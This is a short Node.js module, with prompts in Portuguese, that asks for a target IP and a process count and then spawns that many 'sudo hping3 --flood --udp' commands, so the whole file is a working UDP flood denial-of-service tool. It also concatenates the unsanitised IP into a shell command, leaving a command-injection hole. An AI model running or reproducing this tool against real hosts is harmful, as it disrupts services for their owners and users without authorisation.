const askQuestion = require("../tools/askQuestion");
const callbackExit = require("../tools/exitListener");
const { exec } = require('child_process');

module.exports = async () => {
    const processes = [];
    const n = await askQuestion("Digite o número de processos: ");
    const ip = await askQuestion("Digite o IP alvo: ")

    for (let i = 0; i < n; i++) {
      processes.push(exec("sudo hping3 --flood --udp " + ip));
    }

    callbackExit(function () {
        console.log("Finalizando ataque...\n");
        processes.forEach(process => process.kill());
    });
    

};